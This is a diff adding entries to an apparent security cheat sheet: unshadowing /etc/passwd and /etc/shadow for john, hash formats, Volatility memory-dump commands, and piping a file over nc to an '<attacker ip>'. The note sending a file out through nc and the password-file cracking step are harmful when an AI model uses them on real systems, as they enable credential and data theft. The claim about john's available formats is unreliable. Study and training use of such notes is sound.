@@ -50,3 +50,38 @@ cat <file> | perl -lpe '$=pack"B*",$'
 ```
 tshark -nr kanes.body -o ssl.keylog_file:./client_random.keylog -T fields -e http2.headers.cookie
 ```
+
+### What command makes it simpler to help `john` use GECOS information from `/etc/passwd/`
+```
+unshadow /etc/passwd /etc/shadow > /tmp/passwd_shadow
+```
+Use this new file as the target for `john`.
+
+### What hash formats are available to specify for john?
+With the `--format=<hash type>` flag, you can specify to load specific hash types instead of letting john try to detect them automatically.
+By specifying a specific format, you can speed up the john runtime and target only the password that you really want.
+The available formats are `--format=HMAC-SHA256`, `--format=md5crypt`, and `--format=md5crypt-long`.
+It seems that hashes that begin with `$1$` are md5crypt and hashes that  begin with `$6$` are sha512crypt.
+
+### What is a memory dump?
+A memory dump is a binary file that contains the complete contents of your system's memory.
+Forensic tools exist to analyze memory dumps. One particular tool for creating a memory dump is DumpIt by Moonsols.
+
+### What tool can be used to inspect a memory file dumped by DumpIt?
+Volatility. The following should list available plugins to use when inspecting a dump file.
+```
+volatility --info
+```
+
+### How do you find the process list from a memory dump?
+```
+volatility -f <dump> pslist
+```
+
+### How to pipe a file through `nc`?
+```
+# From:
+cat <file> | nc -u -b <attacker ip> <port>
+# To:
+nc -l -u -p <port> > <file>
+```
